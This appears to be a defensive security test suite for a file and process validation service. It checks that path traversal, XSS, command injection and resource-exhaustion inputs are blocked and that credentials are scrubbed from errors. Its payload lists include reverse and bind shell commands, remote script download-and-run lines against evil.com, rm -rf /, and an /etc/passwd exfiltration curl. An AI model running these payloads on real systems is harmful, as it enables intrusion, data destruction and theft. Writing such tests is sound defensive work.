/**

- @fileoverview Comprehensive Security Test Suite
-
- Tests all security services with:
- - Unit tests for individual security components
- - Integration tests for security service interactions
- - Penetration tests for common attack vectors
- - Compliance validation tests
- - Performance tests under security constraints
- - Fuzzing tests with malicious inputs
-
- Security Test Coverage:
- - Path traversal attack prevention
- - Command injection prevention
- - Resource exhaustion attacks
- - Information disclosure prevention
- - Rate limiting effectiveness
- - Error handling security
 */

import {
  afterEach,
  beforeAll,
  beforeEach,
  describe,
  expect,
  test,
} from 'bun:test';
import { ErrorCodes, SandboxError } from '@/domain/errors';
import { createTimestamp } from '@/shared/types/brands';
import {
  type ProcessExecutionContext,
  ProcessSecurityFactory,
  type ProcessSecurityService,
  type SecureErrorHandler,
  type SecurityConfig,
  type SecurityConfigManager,
  SecurityMonitor,
  SecuritySandbox,
  SecurityServiceFactory,
  type SecurityThreat,
  SecurityValidator,
} from './index';

/**

- Test utilities and helpers
 */
class SecurityTestUtils {
  /**
  - Generates malicious path traversal payloads
   */
  static getPathTraversalPayloads(): string[] {
    return [
      '../../../etc/passwd',
      '..\\..\\..\\windows\\system32\\config\\sam',
      '%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd',
      '....//....//....//etc/passwd',
      '..%252f..%252f..%252fetc%252fpasswd',
      '..%c0%af..%c0%af..%c0%afetc%c0%afpasswd',
      '/var/www/../../etc/passwd',
      'file:///etc/passwd',
      '\\\\..\\\\..\\\\..\\\\etc\\\\passwd',
      '%2e%2e%5c%2e%2e%5c%2e%2e%5cetc%5cpasswd',
    ];
  }

  /**

- Generates command injection payloads
   */
  static getCommandInjectionPayloads(): string[] {
    return [
      '; rm -rf /',
      '| nc -l 4444',
      '&& curl evil.com',
      '$(curl evil.com)',
      '`rm important.txt`',
      '${IFS}cat${IFS}/etc/passwd',
      '; powershell -encodedCommand',
      '|powershell.exe',
      '&cmd.exe /c dir',
      '; /bin/bash -i',
      '|| wget malicious.sh',
    ];
  }

  /**

- Generates script injection payloads
   */
  static getScriptInjectionPayloads(): string[] {
    return [
      '<script>alert("xss")</script>',
      'javascript:alert(1)',
      '<img src=x onerror=alert(1)>',
      '<svg onload=alert(1)>',
      'data:text/html,<script>alert(1)</script>',
      'vbscript:msgbox("xss")',
      '<iframe src=javascript:alert(1)>',
      '<object data=javascript:alert(1)>',
      '<embed src=javascript:alert(1)>',
      'eval("malicious code")',
      'setTimeout("alert(1)", 100)',
    ];
  }

  /**

- Generates malicious content patterns
   */
  static getMaliciousContentPayloads(): string[] {
    return [
      '-----BEGIN PRIVATE KEY-----\nMIIEvgIBADANBgkqhkiG9w0BAQEFAASCBKgwggSkAgEAAoIBAQC7',
      'password=admin123',
      'api_key=sk-1234567890abcdef',
      'secret=very_secret_value',
      'token=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9',
      'ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQC7',
      'BEGIN PGP PRIVATE KEY BLOCK',
      'mysql://user:pass@localhost/db',
      'mongodb://admin:password@server:27017',
      'user@example.com',
      '123-45-6789',
      '4111-1111-1111-1111',
    ];
  }

  /**

- Generates resource exhaustion payloads
   */
  static getResourceExhaustionPayloads(): Array<{
    type: string;
    payload: any;
  }> {
    return [
      { type: 'large_string', payload: 'A'.repeat(10* 1024 * 1024) }, // 10MB string
      {
        type: 'deep_object',
        payload: SecurityTestUtils.createDeepObject(1000),
      },
      {
        type: 'wide_object',
        payload: SecurityTestUtils.createWideObject(10_000),
      },
      { type: 'null_bytes', payload: '\0'.repeat(1000) },
      { type: 'unicode_bombs', payload: '𝕏'.repeat(100_000) },
    ];
  }

  /**

- Creates deeply nested object for testing
   */
  static createDeepObject(depth: number): any {
    let obj: any = { value: 'deep' };
    for (let i = 0; i < depth; i++) {
      obj = { child: obj };
    }
    return obj;
  }

  /**

- Creates wide object with many properties
   */
  static createWideObject(properties: number): any {
    const obj: any = {};
    for (let i = 0; i < properties; i++) {
      obj[`prop_${i}`] = `value_${i}`;
    }
    return obj;
  }

  /**

- Simulates rapid requests for rate limiting tests
   */
  static async simulateRapidRequests(
    requestFn: () => Promise<any>,
    count: number,
    intervalMs = 10
  ): Promise<Array<{ success: boolean; error?: any }>> {
    const results: Array<{ success: boolean; error?: any }> = [];

    for (let i = 0; i < count; i++) {
      try {
        await requestFn();
        results.push({ success: true });
      } catch (error) {
        results.push({ success: false, error });
      }

      if (intervalMs > 0 && i < count - 1) {
        await new Promise((resolve) => setTimeout(resolve, intervalMs));
      }
    }

    return results;
  }
}

/**

- Security test fixtures
 */
class SecurityTestFixtures {
  static async createTestSecuritySystem(): Promise<{
    validator: SecurityValidator;
    sandbox: SecuritySandbox;
    monitor: SecurityMonitor;
    errorHandler: SecureErrorHandler;
    configManager: SecurityConfigManager;
    config: SecurityConfig;
  }> {
    const factory = SecurityServiceFactory.getInstance();
    return factory.createForEnvironment('testing', ['owasp']);
  }

  static async createTempDirectory(): Promise<string> {
    const tempDir = `/tmp/security-test-${Date.now()}`;
    await import('fs').then((fs) =>
      fs.promises.mkdir(tempDir, { recursive: true })
    );
    return tempDir;
  }

  static async cleanupTempDirectory(tempDir: string): Promise<void> {
    try {
      await import('fs').then((fs) =>
        fs.promises.rm(tempDir, { recursive: true, force: true })
      );
    } catch {
      // Ignore cleanup errors
    }
  }
}

describe('SecurityValidator', () => {
  let validator: SecurityValidator;

  beforeEach(() => {
    validator = new SecurityValidator();
  });

  afterEach(() => {
    validator.clearRateLimits();
  });

  describe('Path Validation', () => {
    test('should block all path traversal attempts', async () => {
      const payloads = SecurityTestUtils.getPathTraversalPayloads();

      for (const payload of payloads) {
        const result = await validator.validateFilePath(payload);

        expect(result.success).toBe(true);
        if (result.success) {
          expect(result.value.valid).toBe(false);
          expect(
            result.value.violations.some((v) => v.type === 'path_traversal')
          ).toBe(true);
          expect(result.value.riskLevel).toBe('critical');
        }
      }
    });

    test('should detect encoded attack patterns', async () => {
      const encodedPayloads = [
        '%2e%2e%2f%2e%2e%2f%2e%2e%2f',
        '%252e%252e%252f',
        '%c0%af%c0%af%c0%af',
      ];

      for (const payload of encodedPayloads) {
        const result = await validator.validateFilePath(payload);

        expect(result.success).toBe(true);
        if (result.success) {
          expect(result.value.valid).toBe(false);
          expect(
            result.value.violations.some((v) => v.type === 'encoded_attack')
          ).toBe(true);
        }
      }
    });

    test('should allow valid file paths', async () => {
      const validPaths = [
        'src/rules.rule.md',
        'docs/getting-started.md',
        'config/settings.json',
        'templates/cursor.hbs',
      ];

      for (const path of validPaths) {
        const result = await validator.validateFilePath(path);

        expect(result.success).toBe(true);
        if (result.success) {
          expect(result.value.valid).toBe(true);
          expect(result.value.violations).toHaveLength(0);
          expect(result.value.riskLevel).toBe('none');
        }
      }
    });
  });

  describe('Content Validation', () => {
    test('should block command injection patterns', async () => {
      const payloads = SecurityTestUtils.getCommandInjectionPayloads();

      for (const payload of payloads) {
        const result = await validator.validateFileContent(payload);

        expect(result.success).toBe(true);
        if (result.success) {
          expect(result.value.valid).toBe(false);
          expect(
            result.value.violations.some((v) => v.type === 'command_injection')
          ).toBe(true);
        }
      }
    });

    test('should block script injection patterns', async () => {
      const payloads = SecurityTestUtils.getScriptInjectionPayloads();

      for (const payload of payloads) {
        const result = await validator.validateFileContent(payload);

        expect(result.success).toBe(true);
        if (result.success) {
          expect(result.value.valid).toBe(false);
          expect(
            result.value.violations.some((v) => v.type === 'script_injection')
          ).toBe(true);
        }
      }
    });

    test('should detect malicious content patterns', async () => {
      const payloads = SecurityTestUtils.getMaliciousContentPayloads();

      for (const payload of payloads) {
        const result = await validator.validateFileContent(payload);

        expect(result.success).toBe(true);
        if (result.success) {
          expect(result.value.valid).toBe(false);
          expect(
            result.value.violations.some(
              (v) =>
                v.type === 'malicious_pattern' ||
                v.type === 'suspicious_content'
            )
          ).toBe(true);
        }
      }
    });

    test('should handle large content appropriately', async () => {
      const largeContent = 'A'.repeat(2 * 1024 * 1024); // 2MB
      const result = await validator.validateFileContent(largeContent);

      expect(result.success).toBe(true);
      if (result.success) {
        expect(result.value.valid).toBe(false);
        expect(
          result.value.violations.some((v) => v.type === 'size_violation')
        ).toBe(true);
      }
    });
  });

  describe('Rate Limiting', () => {
    test('should enforce rate limits', async () => {
      const results = await SecurityTestUtils.simulateRapidRequests(
        () => validator.validateFilePath('test.txt'),
        150, // Exceed default limit of 100
        5
      );

      const failures = results.filter((r) => !r.success);
      expect(failures.length).toBeGreaterThan(0);
    });

    test('should apply penalty periods', async () => {
      // Trigger rate limit
      await SecurityTestUtils.simulateRapidRequests(
        () => validator.validateFilePath('test.txt'),
        150,
        1
      );

      // Should still be in penalty period
      const result = await validator.validateFilePath('another-test.txt');
      expect(result.success).toBe(false);
    });
  });
});

describe('SecuritySandbox', () => {
  let sandbox: SecuritySandbox;
  let tempDir: string;

  beforeEach(async () => {
    tempDir = await SecurityTestFixtures.createTempDirectory();

    const config = {
      allowedPaths: [tempDir],
      maxFileSize: 1024 * 1024, // 1MB
      maxFiles: 10,
      maxDirectories: 5,
      maxDepth: 3,
      operationTimeoutMs: 5000,
      memoryLimitBytes: 100 * 1024 * 1024, // 100MB
      cpuTimeoutMs: 5000,
      allowSymlinks: false,
      allowHiddenFiles: false,
      quarantineEnabled: true,
      auditEnabled: true,
    };

    sandbox = new SecuritySandbox(config);
  });

  afterEach(async () => {
    await SecurityTestFixtures.cleanupTempDirectory(tempDir);
    sandbox.clearQuarantine();
    sandbox.resetResourceUsage();
  });

  describe('Path Validation', () => {
    test('should block access outside allowed paths', async () => {
      const result = await sandbox.validatePath('/etc/passwd');

      expect(result.success).toBe(false);
      expect(result.error.message).toContain(
        'outside allowed sandbox boundaries'
      );
    });

    test('should allow access within allowed paths', async () => {
      const testPath = `${tempDir}/test.txt`;
      const result = await sandbox.validatePath(testPath);

      expect(result.success).toBe(true);
      if (result.success) {
        expect(result.value.allowed).toBe(true);
        expect(result.value.canonicalPath).toContain(tempDir);
      }
    });

    test('should detect symlink attacks', async () => {
      // Create a symlink pointing outside sandbox (if filesystem supports it)
      try {
        const fs = await import('fs');
        const linkPath = `${tempDir}/malicious-link`;
        await fs.promises.symlink('/etc/passwd', linkPath);

        const result = await sandbox.validatePath(linkPath);

        if (result.success && result.value.metadata.isSymlink) {
          expect(
            result.value.threats.some((t) => t.type === 'symlink_attack')
          ).toBe(true);
        }
      } catch {
        // Skip if symlinks not supported
      }
    });
  });

  describe('Resource Limits', () => {
    test('should enforce memory limits', async () => {
      const result = await sandbox.enforceResourceLimits(
        'test',
        200 *1024* 1024
      ); // 200MB

      expect(result.success).toBe(false);
      expect(result.error.message).toContain('Memory limit exceeded');
    });

    test('should track resource usage', async () => {
      await sandbox.validatePath(`${tempDir}/file1.txt`);
      await sandbox.validatePath(`${tempDir}/file2.txt`);

      const usage = sandbox.getResourceUsage();
      expect(usage.operationsCount).toBeGreaterThanOrEqual(2);
    });
  });

  describe('Threat Detection', () => {
    test('should detect rapid access patterns', async () => {
      const testPath = `${tempDir}/rapid-access.txt`;

      // Simulate rapid access
      for (let i = 0; i < 15; i++) {
        await sandbox.validatePath(testPath);
      }

      const threats = sandbox.getThreats();
      expect(threats.some((t) => t.type === 'rapid_file_access')).toBe(true);
    });

    test('should quarantine suspicious paths', async () => {
      const suspiciousPath = `${tempDir}/suspicious.txt`;

      sandbox.quarantinePath(suspiciousPath, 'Test quarantine');

      const result = await sandbox.validatePath(suspiciousPath);
      expect(result.success).toBe(false);
      expect(result.error.message).toContain('quarantined');
    });
  });
});

describe('SecurityMonitor', () => {
  let monitor: SecurityMonitor;

  beforeEach(() => {
    const config = {
      alerting: {
        enabled: true,
        minSeverity: 'medium' as const,
        throttleMs: 1000,
        maxAlertsPerHour: 10,
      },
      anomalyDetection: {
        enabled: true,
        windowSizeMs: 60_000,
        thresholdMultiplier: 2,
        minSamples: 5,
        features: ['request_rate', 'error_rate'] as const,
      },
      auditLogging: {
        enabled: true,
        rotationSizeBytes: 1024 * 1024,
        maxLogFiles: 5,
        compressionEnabled: false,
      },
      metrics: {
        enabled: true,
        retentionDays: 7,
        aggregationIntervalMs: 10_000,
      },
      realTimeMonitoring: {
        enabled: true,
        updateIntervalMs: 1000,
        maxEventHistory: 1000,
      },
    };

    monitor = new SecurityMonitor(config);
  });

  describe('Event Logging', () => {
    test('should log security events', async () => {
      const result = await monitor.logSecurityEvent(
        'threat_detected',
        'high',
        'Test threat detected',
        { testData: 'value' }
      );

      expect(result.success).toBe(true);
      if (result.success) {
        expect(result.value.type).toBe('threat_detected');
        expect(result.value.severity).toBe('high');
        expect(result.value.description).toBe('Test threat detected');
      }
    });

    test('should create audit trail', async () => {
      await monitor.logSecurityEvent('access_granted', 'info', 'File accessed');
      await monitor.logSecurityEvent(
        'access_denied',
        'medium',
        'Access blocked'
      );

      const auditLog = monitor.getAuditLog();
      expect(auditLog.length).toBeGreaterThanOrEqual(2);
    });
  });

  describe('Threat Reporting', () => {
    test('should report security threats', async () => {
      const threat: SecurityThreat = {
        type: 'path_traversal_attempt',
        severity: 'critical',
        description: 'Path traversal detected',
        path: '../../../etc/passwd',
        timestamp: createTimestamp(Date.now()),
        context: { operation: 'read' },
        automated: true,
        mitigated: false,
      };

      const result = await monitor.reportThreat(threat);

      expect(result.success).toBe(true);
      if (result.success) {
        expect(result.value.type).toBe('attack_blocked');
        expect(result.value.threat).toEqual(threat);
      }
    });
  });

  describe('Metrics Collection', () => {
    test('should collect security metrics', async () => {
      await monitor.logSecurityEvent('threat_detected', 'high', 'Test 1');
      await monitor.logSecurityEvent('attack_blocked', 'critical', 'Test 2');

      const metrics = monitor.getMetrics();
      expect(metrics.totalEvents).toBeGreaterThanOrEqual(2);
      expect(metrics.threatsDetected).toBeGreaterThanOrEqual(1);
      expect(metrics.attacksBlocked).toBeGreaterThanOrEqual(1);
    });
  });
});

describe('SecureErrorHandler', () => {
  let errorHandler: SecureErrorHandler;
  let monitor: SecurityMonitor;

  beforeEach(async () => {
    const securitySystem =
      await SecurityTestFixtures.createTestSecuritySystem();
    monitor = securitySystem.monitor;
    errorHandler = securitySystem.errorHandler;
  });

  describe('Error Sanitization', () => {
    test('should sanitize sensitive information in errors', async () => {
      const sensitiveError = new Error(
        'Failed to read /home/user/.ssh/id_rsa with password=secret123'
      );

      const result = await errorHandler.handleError(sensitiveError, {
        operation: 'readFile',
        exposureLevel: 'minimal',
      });

      expect(result.success).toBe(true);
      if (result.success) {
        expect(result.value.sensitive).toBe(true);
        expect(result.value.scrubbed.length).toBeGreaterThan(0);
        expect(result.value.sanitizedError.message).not.toContain(
          'password=secret123'
        );
        expect(result.value.sanitizedError.message).not.toContain(
          '/home/user/.ssh/id_rsa'
        );
      }
    });

    test('should respect exposure levels', async () => {
      const testError = new Error('Detailed error message');

      const minimalResult = await errorHandler.handleError(testError, {
        operation: 'test',
        exposureLevel: 'minimal',
      });

      const internalResult = await errorHandler.handleError(testError, {
        operation: 'test',
        exposureLevel: 'internal',
      });

      expect(minimalResult.success).toBe(true);
      expect(internalResult.success).toBe(true);

      if (minimalResult.success && internalResult.success) {
        expect(
          minimalResult.value.sanitizedError.message.length
        ).toBeLessThanOrEqual(
          internalResult.value.sanitizedError.message.length
        );
      }
    });
  });

  describe('Information Disclosure Prevention', () => {
    test('should block internal paths in error messages', async () => {
      const pathError = new Error(
        "ENOENT: no such file or directory, open '/Users/admin/secrets/config.json'"
      );

      const result = await errorHandler.handleError(pathError, {
        operation: 'readFile',
        exposureLevel: 'minimal',
      });

      expect(result.success).toBe(true);
      if (result.success) {
        expect(result.value.sanitizedError.message).not.toContain(
          '/Users/admin/secrets'
        );
        expect(result.value.scrubbed.includes('paths')).toBe(true);
      }
    });

    test('should block credentials in error messages', async () => {
      const credError = new Error(
        'Connection failed: mysql://admin:password123@localhost/db'
      );

      const result = await errorHandler.handleError(credError, {
        operation: 'connect',
        exposureLevel: 'minimal',
      });

      expect(result.success).toBe(true);
      if (result.success) {
        expect(result.value.sanitizedError.message).not.toContain(
          'password123'
        );
        expect(result.value.scrubbed.includes('credentials')).toBe(true);
      }
    });
  });
});

describe('Security Integration Tests', () => {
  let securitySystem: {
    validator: SecurityValidator;
    sandbox: SecuritySandbox;
    monitor: SecurityMonitor;
    errorHandler: SecureErrorHandler;
    configManager: SecurityConfigManager;
    config: SecurityConfig;
  };
  let tempDir: string;

  beforeEach(async () => {
    tempDir = await SecurityTestFixtures.createTempDirectory();
    securitySystem = await SecurityTestFixtures.createTestSecuritySystem();
  });

  afterEach(async () => {
    await SecurityTestFixtures.cleanupTempDirectory(tempDir);
    securitySystem.validator.clearRateLimits();
    securitySystem.sandbox.clearQuarantine();
    securitySystem.sandbox.resetResourceUsage();
  });

  describe('End-to-End Security Flow', () => {
    test('should handle complete security validation flow', async () => {
      const maliciousPath = '../../../etc/passwd';

      // 1. Validator should catch the malicious path
      const validationResult =
        await securitySystem.validator.validateFilePath(maliciousPath);
      expect(validationResult.success).toBe(true);
      expect(validationResult.value.valid).toBe(false);

      // 2. Sandbox should also block it
      const sandboxResult =
        await securitySystem.sandbox.validatePath(maliciousPath);
      expect(sandboxResult.success).toBe(false);

      // 3. Monitor should have logged the event
      const events = securitySystem.monitor.getRecentEvents(10);
      expect(events.length).toBeGreaterThan(0);

      // 4. Error handler should sanitize any resulting errors
      if (sandboxResult.success === false) {
        const errorResult = await securitySystem.errorHandler.handleError(
          sandboxResult.error,
          { operation: 'validatePath', exposureLevel: 'minimal' }
        );
        expect(errorResult.success).toBe(true);
      }
    });
  });

  describe('Performance Under Security Constraints', () => {
    test('should maintain performance with security enabled', async () => {
      const startTime = Date.now();
      const iterations = 100;

      for (let i = 0; i < iterations; i++) {
        const validPath = `test-file-${i}.txt`;
        await securitySystem.validator.validateFilePath(validPath);
      }

      const endTime = Date.now();
      const avgTimePerOperation = (endTime - startTime) / iterations;

      // Should complete validation in reasonable time (adjust threshold as needed)
      expect(avgTimePerOperation).toBeLessThan(50); // 50ms per operation
    });
  });

  describe('Compliance Validation', () => {
    test('should meet OWASP security requirements', async () => {
      const config = securitySystem.config;

      // OWASP A01: Broken Access Control
      expect(config.sandbox.auditEnabled).toBe(true);

      // OWASP A02: Cryptographic Failures
      expect(config.encryption.algorithm).toBe('AES-256-GCM');

      // OWASP A03: Injection
      expect(config.validation.inputSanitization.enabled).toBe(true);

      // OWASP A05: Security Misconfiguration
      expect(config.errorHandling.defaultExposureLevel).not.toBe('internal');

      // OWASP A09: Security Logging and Monitoring Failures
      expect(config.monitoring.auditLogging.enabled).toBe(true);
    });
  });
});

describe('Penetration Tests', () => {
  let securitySystem: any;
  let tempDir: string;

  beforeEach(async () => {
    tempDir = await SecurityTestFixtures.createTempDirectory();
    securitySystem = await SecurityTestFixtures.createTestSecuritySystem();
  });

  afterEach(async () => {
    await SecurityTestFixtures.cleanupTempDirectory(tempDir);
  });

  describe('Path Traversal Penetration Tests', () => {
    test('should block all known path traversal techniques', async () => {
      const payloads = [
        ...SecurityTestUtils.getPathTraversalPayloads(),
        // Additional sophisticated payloads
        '....//....//....//etc/passwd',
        '..%252f..%252f..%252fetc%252fpasswd',
        '..%c0%af..%c0%af..%c0%afetc%c0%afpasswd',
        '%2e%2e%2f%2e%2e%2f%2e%2e%2f%65%74%63%2f%70%61%73%73%77%64',
        '\\..\\..\\..\\etc\\passwd',
        '//..\\..//..\\/etc/passwd',
      ];

      let blockedCount = 0;

      for (const payload of payloads) {
        try {
          const result =
            await securitySystem.validator.validateFilePath(payload);

          if (result.success && !result.value.valid) {
            blockedCount++;
          }
        } catch {
          // Any exception also counts as blocked
          blockedCount++;
        }
      }

      // Should block 100% of path traversal attempts
      expect(blockedCount).toBe(payloads.length);
    });
  });

  describe('Resource Exhaustion Attacks', () => {
    test('should prevent memory exhaustion attacks', async () => {
      const largePayloads = SecurityTestUtils.getResourceExhaustionPayloads();

      for (const { type, payload } of largePayloads) {
        const payloadString =
          typeof payload === 'string' ? payload : JSON.stringify(payload);

        const result =
          await securitySystem.validator.validateFileContent(payloadString);

        if (result.success) {
          // Should either be invalid or fail due to size limits
          if (result.value.valid) {
            // If somehow valid, the content should be sanitized/truncated
            expect(result.value.sanitizedValue?.length || 0).toBeLessThan(
              payloadString.length
            );
          }
        }
      }
    });

    test('should prevent rapid request attacks', async () => {
      const rapidResults = await SecurityTestUtils.simulateRapidRequests(
        () => securitySystem.validator.validateFilePath('test.txt'),
        200, // Way beyond rate limit
        1
      );

      const blockedRequests = rapidResults.filter((r) => !r.success);

      // Should block excessive requests
      expect(blockedRequests.length).toBeGreaterThan(0);
      expect(blockedRequests.length / rapidResults.length).toBeGreaterThan(0.3); // At least 30% blocked
    });
  });

  describe('Command Injection Penetration Tests', () => {
    test('should block all command injection vectors', async () => {
      const payloads = [
        ...SecurityTestUtils.getCommandInjectionPayloads(),
        // Additional sophisticated payloads
        '; echo "pwned" > /tmp/hacked',
        '| nc -lvp 4444 -e /bin/bash',
        '&& wget http://evil.com/malware.sh -O /tmp/malware.sh && chmod +x /tmp/malware.sh && /tmp/malware.sh',
        '`curl -s http://evil.com/steal.sh | bash`',
        '$(python -c "import os; os.system(\\'rm -rf /\\')")',
        '${IFS}curl${IFS}evil.com/exfiltrate${IFS}-d${IFS}@/etc/passwd'
      ];

      let blockedCount = 0;

      for (const payload of payloads) {
        const result =
          await securitySystem.validator.validateFileContent(payload);

        if (result.success && !result.value.valid) {
          const hasCommandInjectionViolation = result.value.violations.some(
            (v) => v.type === 'command_injection'
          );
          if (hasCommandInjectionViolation) {
            blockedCount++;
          }
        }
      }

      // Should block all command injection attempts
      expect(blockedCount).toBe(payloads.length);
    });
  });

  describe('Information Disclosure Tests', () => {
    test('should prevent sensitive information leakage', async () => {
      const sensitiveErrors = [
        new Error(
          'Failed to connect to mysql://admin:secret123@db.internal:3306/production'
        ),
        new Error('Cannot read file /home/deploy/.ssh/id_rsa'),
        new Error('API key sk-1234567890abcdef validation failed'),
        new Error('JWT token eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9 is invalid'),
        new Error('User email user@company.com not found in database'),
        new Error('Credit card 4111-1111-1111-1111 processing failed'),
      ];

      for (const error of sensitiveErrors) {
        const result = await securitySystem.errorHandler.handleError(error, {
          operation: 'test',
          exposureLevel: 'minimal',
        });

        expect(result.success).toBe(true);
        if (result.success) {
          // Should be marked as sensitive
          expect(result.value.sensitive).toBe(true);

          // Should have scrubbed sensitive patterns
          expect(result.value.scrubbed.length).toBeGreaterThan(0);

          // Sanitized message should not contain original sensitive data
          const sanitizedMessage =
            result.value.sanitizedError.message.toLowerCase();
          expect(sanitizedMessage).not.toContain('secret123');
          expect(sanitizedMessage).not.toContain('sk-1234567890abcdef');
          expect(sanitizedMessage).not.toContain('4111-1111-1111-1111');
          expect(sanitizedMessage).not.toContain('user@company.com');
        }
      }
    });
  });
});

describe('ProcessSecurityService', () => {
  let processSecurityService: ProcessSecurityService;
  let monitor: SecurityMonitor;
  let errorHandler: SecureErrorHandler;

  beforeEach(async () => {
    const securitySystem =
      await SecurityTestFixtures.createTestSecuritySystem();
    monitor = securitySystem.monitor;
    errorHandler = securitySystem.errorHandler;

    processSecurityService = ProcessSecurityFactory.createWithDefaults(
      monitor,
      errorHandler
    );
  });

  afterEach(async () => {
    await processSecurityService.cleanup();
  });

  describe('Process Execution', () => {
    test('should execute safe commands successfully', async () => {
      const context: ProcessExecutionContext = {
        command: 'echo',
        arguments: ['hello', 'world'],
        workingDirectory: process.cwd(),
        environment: { PATH: process.env.PATH || '' },
        timeout: 5000,
        memoryLimit: 100 *1024* 1024, // 100MB
        cpuLimit: 50,
      };

      const result = await processSecurityService.executeSecureProcess(context);

      expect(result.success).toBe(true);
      if (result.success) {
        expect(result.value.exitCode).toBe(0);
        expect(result.value.stdout).toContain('hello world');
        expect(result.value.violations).toHaveLength(0);
        expect(result.value.killed).toBe(false);
        expect(result.value.timeout).toBe(false);
      }
    });

    test('should block dangerous commands', async () => {
      const dangerousCommands = ['rm', 'sudo', 'chmod', 'passwd'];

      for (const cmd of dangerousCommands) {
        const context: ProcessExecutionContext = {
          command: cmd,
          arguments: ['-rf', '/'],
          workingDirectory: process.cwd(),
          environment: {},
          timeout: 5000,
          memoryLimit: 100 * 1024 * 1024,
          cpuLimit: 50,
        };

        const result =
          await processSecurityService.executeSecureProcess(context);

        expect(result.success).toBe(false);
        if (!result.success) {
          expect(result.error.code).toBe('PROCESS_VALIDATION_FAILED');
        }
      }
    });

    test('should enforce execution timeouts', async () => {
      const context: ProcessExecutionContext = {
        command: 'sleep',
        arguments: ['10'], // Sleep for 10 seconds
        workingDirectory: process.cwd(),
        environment: {},
        timeout: 1000, // But timeout after 1 second
        memoryLimit: 100 * 1024 * 1024,
        cpuLimit: 50,
      };

      const result = await processSecurityService.executeSecureProcess(context);

      if (result.success) {
        expect(result.value.timeout).toBe(true);
        expect(result.value.killed).toBe(true);
        expect(
          result.value.violations.some((v) => v.type === 'execution_timeout')
        ).toBe(true);
      }
    });

    test('should validate environment variables', async () => {
      const context: ProcessExecutionContext = {
        command: 'echo',
        arguments: ['test'],
        workingDirectory: process.cwd(),
        environment: {
          LD_PRELOAD: '/malicious/lib.so', // Dangerous environment variable
          NORMAL_VAR: 'safe_value',
        },
        timeout: 5000,
        memoryLimit: 100 * 1024 * 1024,
        cpuLimit: 50,
      };

      const result = await processSecurityService.executeSecureProcess(context);

      expect(result.success).toBe(false);
      if (!result.success) {
        expect(result.error.message).toContain('validation failed');
      }
    });
  });

  describe('Resource Management', () => {
    test('should track global resource usage', () => {
      const usage = processSecurityService.getGlobalResourceUsage();

      expect(usage.memory.memoryUsageBytes).toBeGreaterThan(0);
      expect(usage.memory.pid).toBe(process.pid);
      expect(usage.processes).toBeGreaterThanOrEqual(0);
      expect(usage.fileDescriptors).toBeGreaterThanOrEqual(0);
      expect(Array.isArray(usage.violations)).toBe(true);
    });

    test('should set resource limits', async () => {
      const result = await processSecurityService.setResourceLimits();

      expect(result.success).toBe(true);

      // Should log the resource limit setup
      const events = monitor.getRecentEvents(10);
      expect(events.some((e) => e.type === 'resource_limits_set')).toBe(true);
    });
  });

  describe('Privilege Management', () => {
    test('should handle privilege dropping gracefully', async () => {
      const result = await processSecurityService.dropPrivileges();

      expect(result.success).toBe(true);
      if (result.success) {
        expect(typeof result.value.uid).toBe('number');
        expect(typeof result.value.gid).toBe('number');
        expect(Array.isArray(result.value.groups)).toBe(true);
      }
    });

    test('should fail gracefully when privilege dropping fails', async () => {
      // Try to drop to a non-existent user
      const result = await processSecurityService.dropPrivileges(
        'nonexistent_user_12345'
      );

      // Should either succeed (if not enabled) or fail gracefully
      expect(typeof result.success).toBe('boolean');
    });
  });

  describe('Security Monitoring', () => {
    test('should emit resource warnings', (done) => {
      processSecurityService.on('resourceWarning', (warning) => {
        expect(warning.type).toBe('high_memory_usage');
        expect(typeof warning.memoryUsed).toBe('number');
        expect(typeof warning.memoryLimit).toBe('number');
        done();
      });

      // This would typically be triggered by actual high memory usage
      // For testing, we can emit it manually or simulate the condition
      processSecurityService.emit('resourceWarning', {
        type: 'high_memory_usage',
        memoryUsed: 1_000_000_000,
        memoryLimit: 512_000_000,
      });
    });

    test('should handle security violations', (done) => {
      processSecurityService.on('resourceViolation', (violation) => {
        expect(violation.type).toBeDefined();
        expect(violation.severity).toBeDefined();
        expect(violation.description).toBeDefined();
        expect(violation.timestamp).toBeDefined();
        done();
      });

      // Simulate a violation
      processSecurityService.emit('resourceViolation', {
        type: 'memory_limit_exceeded' as const,
        description: 'Test violation',
        severity: 'critical' as const,
        threshold: 100,
        actual: 200,
        timestamp: createTimestamp(Date.now()),
      });
    });
  });

  describe('Cleanup and Termination', () => {
    test('should cleanup all resources', async () => {
      const result = await processSecurityService.cleanup();

      expect(result.success).toBe(true);
      if (result.success) {
        expect(typeof result.value).toBe('number'); // Number of killed processes
      }
    });
  });
});

describe('Fuzzing Tests', () => {
  let validator: SecurityValidator;

  beforeEach(() => {
    validator = new SecurityValidator();
  });

  afterEach(() => {
    validator.clearRateLimits();
  });

  test('should handle random malformed inputs gracefully', async () => {
    const fuzzInputs = [];

    // Generate random malformed inputs
    for (let i = 0; i < 100; i++) {
      const randomLength = Math.floor(Math.random() * 1000);
      const randomChars = Array.from({ length: randomLength }, () =>
        String.fromCharCode(Math.floor(Math.random() * 256))
      ).join('');
      fuzzInputs.push(randomChars);
    }

    let handledCount = 0;

    for (const input of fuzzInputs) {
      try {
        const result = await validator.validateFilePath(input);
        // Should either succeed or fail gracefully
        expect(typeof result.success).toBe('boolean');
        handledCount++;
      } catch (error) {
        // Should not throw unhandled exceptions
        expect(error).toBeInstanceOf(Error);
        handledCount++;
      }
    }

    // Should handle all inputs without crashing
    expect(handledCount).toBe(fuzzInputs.length);
  });

  test('should handle edge case inputs', async () => {
    const edgeCases = [
      '', // empty string
      null as any, // null
      undefined as any, // undefined
      123 as any, // number
      {} as any, // object
      [] as any, // array
      '\0', // null byte
      '\uFFFF', // unicode edge
      'A'.repeat(10_000), // very long string
      '🚀'.repeat(1000), // unicode emojis
      '\r\n\t\v\f', // whitespace characters
      String.fromCharCode(0, 1, 2, 3, 4, 5), // control characters
    ];

    for (const edgeCase of edgeCases) {
      const result = await validator.validateFilePath(edgeCase);
      // Should handle gracefully - either succeed or fail with proper error
      expect(typeof result.success).toBe('boolean');
    }
  });
});
